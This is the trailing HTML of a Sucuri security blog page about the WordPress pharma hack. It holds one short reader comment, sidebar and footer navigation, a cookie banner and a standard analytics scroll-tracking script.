		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/82fb3db19d1b434c61a71e805899d45b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/82fb3db19d1b434c61a71e805899d45b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://whatsapplovestatus.in/whatsapp-love-status/" class="comment-author-link" rel="external nofollow" itemprop="url">Suman Hussain</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2017-12-28T04:55:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-8134">December 28, 2017</a></time></p>		</header>

		<div class="comment-content">
			
			<p>And Thanks for coding i like that!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea504d77ef0">Search the blog</label><input type="search" name="s" id="searchform-62ea504d77ef0" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-13" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://info.sucuri.net/wordpress-security-course?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Email-Course&amp;utm_term=EN&amp;utm_content=WordPress-Security" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23218 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/04/blog-sidebar_widgetlogic_emailCourse_wordpress-security.png" alt="WordPress Security Course" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-30" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/wordpress-security?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=WP-Security" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23353 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_wordpress-security.png" alt="WordPress Security Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-36" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/what-is-seo-spam-and-how-to-fight-it?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=SEO-Spam" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23487 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_seo-spam.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '​​', customerEmail: '​​'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
